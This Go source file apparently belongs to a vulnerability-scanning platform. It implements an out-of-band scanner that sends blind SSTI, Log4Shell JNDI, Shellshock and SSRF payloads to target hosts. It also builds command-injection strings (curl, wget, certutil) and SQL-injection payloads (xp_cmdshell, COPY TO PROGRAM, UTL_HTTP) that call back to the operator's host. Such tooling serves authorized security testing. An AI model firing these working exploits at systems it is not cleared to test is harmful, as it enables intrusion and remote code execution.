package scanner

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/recon-platform/internal/config"
	"github.com/recon-platform/internal/database"
	"github.com/recon-platform/internal/tools"
	"github.com/recon-platform/pkg/logger"
)

// OASTScanner detects BLIND server-side bugs — SSRF and command injection (RCE)
// — that produce no visible response difference and therefore can't be seen by
// signature or timing checks. It plants payloads that make the TARGET SERVER
// itself reach out to /oob/<token> on this platform. When that callback arrives
// (handled in the API layer) we have proof of out-of-band execution and raise a
// confirmed finding, correlated back to the exact injection point by token.
//
// This is HTTP-based OAST served by this app itself — no third-party service and
// no API key. Its one honest limitation: a target that cannot make an outbound
// HTTP request to our host (strict egress filtering, DNS-only exfil) won't call
// back; for those, the interactsh_server integration used by nuclei complements
// this.
type OASTScanner struct {
	db        *database.DB
	exec      *tools.Executor
	cfg       *config.Config
	logger    *logger.Logger
	broadcast BroadcastFunc
}

func NewOASTScanner(db *database.DB, exec *tools.Executor, cfg *config.Config, log *logger.Logger, broadcast BroadcastFunc) *OASTScanner {
	return &OASTScanner{db: db, exec: exec, cfg: cfg, logger: log, broadcast: broadcast}
}

var oastClient = newPooledClient(12*time.Second, false)

func (s *OASTScanner) Run(ctx context.Context, targetID string, logFn LogFunc) error {
	base := strings.TrimRight(s.cfg.BlindXSSCallbackURL, "/")
	if base == "" {
		logFn("warn", "oast", "Blind SSRF/RCE skipped — no callback URL configured (set blind_xss_callback_url to this app's public URL).")
		return nil
	}
	// The value injected must be a bare host[:port] for some contexts and a full
	// URL for others; derive both from the configured public URL.
	callbackHost := stripScheme(base)
	// For JNDI/Log4Shell the target's LDAP client connects to the raw OOB listener
	// (host without the HTTP port) on OOBRawPort (canonical 1389 when unset).
	oobHost := oobHostOnly(base)
	rawPort := s.cfg.OOBRawPort
	if rawPort <= 0 {
		rawPort = 1389
	}

	points := loadInsertionPoints(ctx, s.db, targetID, s.cfg.URLLimit())
	auth := loadAuthHeaders(ctx, s.db, targetID)
	logFn("info", "oast", fmt.Sprintf("Planting out-of-band SSTI/Log4Shell probes across %d insertion points...", len(points)))

	sem := make(chan struct{}, 12)
	var wg sync.WaitGroup
	planted := 0

	for _, ip := range points {
		if ctx.Err() != nil {
			break
		}

		// NOTE: blind SSRF, RCE and SQLi are no longer planted here. Each objective
		// now OWNS its own out-of-band confirmation via the shared oobCapability:
		// blind SSRF in SSRFScanner.plantBlindSSRF, blind RCE in
		// CmdiScanner.plantBlindRCE, blind SQLi in SQLiScanner.plantBlindSQLi, blind
		// XXE in XXEScanner. That keeps a single-objective scan (e.g. SQLi-only) from
		// planting — and therefore emitting findings for — unrelated vulnerability
		// classes. This module retains the classes without a dedicated home below
		// (blind SSTI, Log4Shell).

		// ── Blind SSTI ── template-engine payloads that RUN a command fetching our
		// host. Catches SSTI whose evaluated output is never rendered back (the
		// in-band {{7*7}} check can't), across Jinja2/Mako/Twig/Smarty/Nunjucks/
		// ERB/Freemarker/SpEL. Same token across engines.
		etoken := s.newProbe(targetID, ip.URL, ip.Param, "ssti", "param:"+ip.Param)
		planted++
		ecb := "http://" + callbackHost + "/oob/" + etoken
		for _, v := range sstiOOBPayloads(ecb) {
			wg.Add(1)
			sem <- struct{}{}
			go func(ip insertionPoint, v string) {
				defer wg.Done()
				defer func() { <-sem }()
				sendInjected(ctx, oastClient, ip, v, auth)
			}(ip, v)
		}

		// ── Blind Log4Shell ── JNDI into web PARAMETERS (the original dominant
		// exploitation vector; the network engine only sprays it through headers).
		// A callback lands on the raw LDAP/RMI listener, correlated by token.
		ltoken := s.newProbe(targetID, ip.URL, ip.Param, "log4shell", "param:"+ip.Param)
		planted++
		lcb := fmt.Sprintf("%s:%d/%s", oobHost, rawPort, ltoken)
		for _, v := range log4ShellParamPayloads(lcb) {
			wg.Add(1)
			sem <- struct{}{}
			go func(ip insertionPoint, v string) {
				defer wg.Done()
				defer func() { <-sem }()
				sendInjected(ctx, oastClient, ip, v, auth)
			}(ip, v)
		}
	}

	// ── Header sinks ── SSRF via proxy-style headers, RCE via Shellshock in
	// User-Agent, and Log4Shell across the Log4j header sinks — one pair of
	// requests per alive host root. Each vector has its OWN token so a callback
	// attributes to the right class.
	roots := s.aliveRoots(ctx, targetID)
	for _, root := range roots {
		if ctx.Err() != nil {
			break
		}
		token := s.newProbe(targetID, root, "", "ssrf", "headers")
		planted++
		cb := "http://" + callbackHost + "/oob/" + token
		l4token := s.newProbe(targetID, root, "", "log4shell", "headers")
		planted++
		l4cb := fmt.Sprintf("%s:%d/%s", oobHost, rawPort, l4token)
		wg.Add(1)
		sem <- struct{}{}
		go func(root, cb, l4cb string) {
			defer wg.Done()
			defer func() { <-sem }()
			reqCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
			defer cancel()
			req, err := http.NewRequestWithContext(reqCtx, "GET", root, nil)
			if err != nil {
				return
			}
			// SSRF via routing headers.
			req.Header.Set("X-Forwarded-Host", stripScheme(cb))
			req.Header.Set("X-Forwarded-For", stripScheme(cb))
			req.Header.Set("Referer", cb)
			req.Header.Set("True-Client-IP", stripScheme(cb))
			// Shellshock RCE via User-Agent (CVE-2014-6271).
			req.Header.Set("User-Agent", "() { :;}; /bin/bash -c 'curl -s "+cb+" || wget -q -O- "+cb+"'")
			for k, v := range auth {
				req.Header.Set(k, v)
			}
			if resp, e := oastClient.Do(req); e == nil {
				resp.Body.Close()
			}

			// Second request: Log4Shell across every known Log4j header sink.
			l4req, err := http.NewRequestWithContext(reqCtx, "GET", root, nil)
			if err != nil {
				return
			}
			jndi := "${jndi:ldap://" + l4cb + "}"
			for _, hName := range log4ShellHeaders {
				l4req.Header.Set(hName, jndi)
			}
			for k, v := range auth {
				l4req.Header.Set(k, v)
			}
			if resp, e := oastClient.Do(l4req); e == nil {
				resp.Body.Close()
			}
		}(root, cb, l4cb)
	}

	wg.Wait()
	logFn("info", "oast", fmt.Sprintf("OAST done. %d blind SSTI/Log4Shell probe(s) planted; execution reported via callback.", planted))
	return nil
}

// rceOOBPayloads wraps an HTTP callback in the common command-injection breakouts
// (Unix and Windows). fetch helpers curl/wget cover Linux; certutil covers Windows.
func rceOOBPayloads(cb string) []string {
	host := stripScheme(cb)
	return []string{
		";curl -s " + cb + ";",
		"|curl -s " + cb,
		"||curl -s " + cb,
		"&&curl -s " + cb,
		"$(curl -s " + cb + ")",
		"`curl -s " + cb + "`",
		"; wget -q -O- " + cb,
		"\ncurl -s " + cb + "\n",
		"& curl -s " + cb,
		// Windows
		"& certutil -urlcache -f " + cb + " x.txt",
		"| nslookup " + host,
	}
}

// sqliOOBPayloads builds out-of-band SQL-injection payloads that force the
// database engine itself to make an HTTP request to our callback. Each DB-family
// primitive is wrapped in the common injection breakouts (string-quote close,
// numeric, stacked-query) so it lands whichever way the parameter is used. host
// is the bare host[:port]; cb is the full http URL.
//
//	Oracle : UTL_HTTP.REQUEST / HTTPURITYPE(...).GETCLOB() — direct HTTP.
//	MSSQL  : xp_cmdshell 'curl <cb>' (direct HTTP) and xp_dirtree \\host\x
//	         (SMB/DNS — resolves host even when HTTP egress to us is blocked).
//	MySQL/PG have no clean HTTP primitive; their OOB path is DNS/SMB via
//	         LOAD_FILE/COPY, covered by the UNC variant.
func sqliOOBPayloads(cb, host string) []string {
	unc := `\\` + host + `\x`
	oracle := "(SELECT UTL_HTTP.REQUEST('" + cb + "') FROM dual)"
	oracleURI := "(SELECT HTTPURITYPE('" + cb + "').GETCLOB() FROM dual)"
	mssqlCurl := "EXEC master..xp_cmdshell 'curl -s " + cb + "'"
	mssqlDir := "EXEC master..xp_dirtree '" + unc + "',1,1"
	// PostgreSQL — COPY ... TO PROGRAM runs a shell command (superuser); the
	// canonical PG OOB/RCE primitive, previously absent entirely.
	pgCopy := "COPY (SELECT '') TO PROGRAM 'curl -s " + cb + "'"

	return []string{
		// Oracle — inline subselect (string and numeric contexts).
		"'||" + oracle + "||'",
		"'||" + oracleURI + "||'",
		"1||" + oracle,
		// MSSQL — stacked query (needs multi-statement) in string / numeric / raw.
		"';" + mssqlCurl + "--",
		"1;" + mssqlCurl + "--",
		";" + mssqlCurl + "--",
		"';" + mssqlDir + "--",
		// PostgreSQL — stacked COPY TO PROGRAM (string / numeric / raw).
		"';" + pgCopy + "--",
		"1;" + pgCopy + "--",
		";" + pgCopy + "--",
		// MySQL/Postgres/MSSQL — UNC/DNS exfil via file access, string + numeric.
		"' AND LOAD_FILE('" + unc + "')-- -",
		"1 AND LOAD_FILE('" + unc + "')",
		// Generic subquery UNC for engines resolving the path during planning.
		"' UNION SELECT LOAD_FILE('" + unc + "')-- -",
	}
}

func (s *OASTScanner) newProbe(targetID, url, param, kind, sink string) string {
	return registerOOBProbe(s.db, targetID, url, param, kind, sink)
}

// registerOOBProbe mints a fresh OAST token and records the injection point in
// oob_probes so an out-of-band callback (HTTP /oob/<token> or the raw JNDI/LDAP
// listener) can be correlated back to it. Package-level so both the OAST scanner
// and the initial-access engine's Log4Shell phase share one code path.
func registerOOBProbe(db *database.DB, targetID, url, param, kind, sink string) string {
	token := newXSSToken("rcnoob")
	_, _ = db.Exec(`
		INSERT INTO oob_probes (token, target_id, url, parameter, kind, sink)
		VALUES (?, ?, ?, ?, ?, ?)
		ON CONFLICT(token) DO NOTHING
	`, token, targetID, url, param, kind, sink)
	return token
}

func (s *OASTScanner) aliveRoots(ctx context.Context, targetID string) []string {
	rows, err := s.db.QueryContext(ctx, `
		SELECT DISTINCT url FROM http_services
		WHERE target_id = ? AND status_code BETWEEN 200 AND 403
		ORDER BY url LIMIT 200`, targetID)
	if err != nil {
		return nil
	}
	defer rows.Close()
	seen := map[string]bool{}
	var out []string
	for rows.Next() {
		var u string
		if rows.Scan(&u) != nil {
			continue
		}
		if b := hostBaseScan(u); b != "" && !seen[b] {
			seen[b] = true
			out = append(out, b)
		}
	}
	return out
}

func stripScheme(u string) string {
	if i := strings.Index(u, "://"); i >= 0 {
		return u[i+3:]
	}
	return u
}
